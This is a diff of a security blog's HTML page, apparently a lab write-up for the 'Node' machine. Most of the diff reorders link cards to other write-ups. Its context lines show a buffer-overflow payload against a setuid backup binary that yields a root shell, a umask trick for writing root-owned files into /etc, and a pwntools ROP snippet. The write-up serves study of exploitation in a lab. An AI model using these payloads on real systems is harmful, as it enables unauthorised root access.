@@ -759,21 +759,21 @@ nx       true</code></pre></div></div></p>
 <span class="p">}</span></code></pre></div>
 
 <p>Then compile it on the box:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ gcc shell.c -o shell</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ gcc shell.c -o shell</code></pre></div></p>
 
 <p>Copy it to /tmp/.backup_%i (and make sure it&rsquo;s executable):
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cp shell /tmp/.backup_%i &amp;&amp; chmod +x /tmp/.backup_%i</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cp shell /tmp/.backup_%i &amp;&amp; chmod +x /tmp/.backup_%i</code></pre></div></p>
 
 <p>It&rsquo;s high time to get root:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">tom@node:/$ /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python2 -c &#39;print(&#34;A&#34;*512+&#34;\xa0\x86\x04\x08&#34;+&#34;\xc0\x86\x04\x08&#34;+&#34;\xd5\x9e\x04\x08&#34;)&#39;)
+<div class="bg-black"><pre><code class="language-console" data-lang="console">tom@node:/$ /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python2 -c &#39;print(&#34;A&#34;*512+&#34;\xa0\x86\x04\x08&#34;+&#34;\xc0\x86\x04\x08&#34;+&#34;\xd5\x9e\x04\x08&#34;)&#39;)
 # whoami
-root</code></pre></div></div></p>
+root</code></pre></div></p>
 
 <p>or</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">tom@node:/$ /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo\t/roo\t.txt $(python2 -c &#39;print(&#34;A&#34;*495+&#34;\xa0\x86\x04\x08&#34;+&#34;\xc0\x86\x04\x08&#34;+&#34;\xd5\x9e\x04\x08&#34;)&#39;)&#34;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">tom@node:/$ /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo\t/roo\t.txt $(python2 -c &#39;print(&#34;A&#34;*495+&#34;\xa0\x86\x04\x08&#34;+&#34;\xc0\x86\x04\x08&#34;+&#34;\xd5\x9e\x04\x08&#34;)&#39;)&#34;
 # whoami
-root</code></pre></div></div>
+root</code></pre></div>
 
 <h2 id="5-using-buffer-overflow-the-brute-force-way">5. Using buffer overflow (the brute-force way)</h2>
 
@@ -814,11 +814,11 @@ root</code></pre></div></div>
 <h2 id="6-writing-files-as-root">6. Writing files as root</h2>
 
 <p>One last interesting note. If we set umask to 0 we can create/write files as root but writable by tom too:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">tom@node:/$ umask 0 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">tom@node:/$ umask 0 
 tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo\t/roo\t.txt &gt; /e\tc/test&#34;
 
 tom@node:/$ ls -al /etc/test
--rw-rw-rw-  1 root tom       0 Oct 15 12:48 test</code></pre></div></div></p>
+-rw-rw-rw-  1 root tom       0 Oct 15 12:48 test</code></pre></div></p>
 
 <p>Note that you cannot use this trick anymore to write cron jobs or ssh keys because nowadays -due to security mitigations- both require/check for stricter permissions.</p>
 
@@ -871,7 +871,7 @@ tom@node:/$ ls -al /etc/test
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./backup&#39;</span><span class="p">)</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/tmp/.backup&#39;</span><span class="p">)))</span>
-<span class="n">rop</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
 
@@ -943,6 +943,38 @@ tom@node:/$ ls -al /etc/test
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
           
            
            
@@ -970,34 +1002,6 @@ tom@node:/$ ls -al /etc/test
           
            
            
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1051,22 +1055,6 @@ tom@node:/$ ls -al /etc/test
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -1103,21 +1091,25 @@ tom@node:/$ ls -al /etc/test
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1164,16 +1156,36 @@ tom@node:/$ ls -al /etc/test
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
+      <time lang="en">19 Sep 2016</time>
+      <time lang="el">19 Σεπ 2016</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nl80211/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
+      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Oct 2016</time>
+      <time lang="el">09 Οκτ 2016</time>
     </footer>
   </a>
 </article>
@@ -1263,6 +1275,26 @@ tom@node:/$ ls -al /etc/test
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
           
            
            
@@ -1284,16 +1316,16 @@ tom@node:/$ ls -al /etc/test
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nl80211/" class="clearfix">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
-      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">09 Oct 2016</time>
-      <time lang="el">09 Οκτ 2016</time>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
     </footer>
   </a>
 </article>
@@ -1335,21 +1367,73 @@ tom@node:/$ ls -al /etc/test
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1382,6 +1466,110 @@ tom@node:/$ ls -al /etc/test
           
            
            
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1451,17 +1639,61 @@ tom@node:/$ ls -al /etc/test
            
            
            
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">19 Sep 2016</time>
-      <time lang="el">19 Σεπ 2016</time>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
     </footer>
   </a>
 </article>
@@ -1494,234 +1726,6 @@ tom@node:/$ ls -al /etc/test
           
            
            
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">21 Jul 2016</time>
-      <time lang="el">21 Ιουλ 2016</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1775,6 +1779,26 @@ tom@node:/$ ls -al /etc/test
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
           
            
            
@@ -1792,16 +1816,16 @@ tom@node:/$ ls -al /etc/test
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
+      <time lang="en">21 Jul 2016</time>
+      <time lang="el">21 Ιουλ 2016</time>
     </footer>
   </a>
 </article>
@@ -1831,17 +1855,33 @@ tom@node:/$ ls -al /etc/test
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1856,6 +1896,8 @@ tom@node:/$ ls -al /etc/test
            
            
           
+          
+           
            
            
            
@@ -1863,27 +1905,341 @@ tom@node:/$ ls -al /etc/test
            
            
            
-          
-           
-           
            
           
            
            
            
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
            
-          
-           
-           
            
           
            
            
            
+           
           
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
           
            
            
@@ -2080,21 +2436,100 @@ tom@node:/$ ls -al /etc/test
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2196,414 +2631,6 @@ tom@node:/$ ls -al /etc/test
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
-      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 Apr 2018</time>
-      <time lang="el">13 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
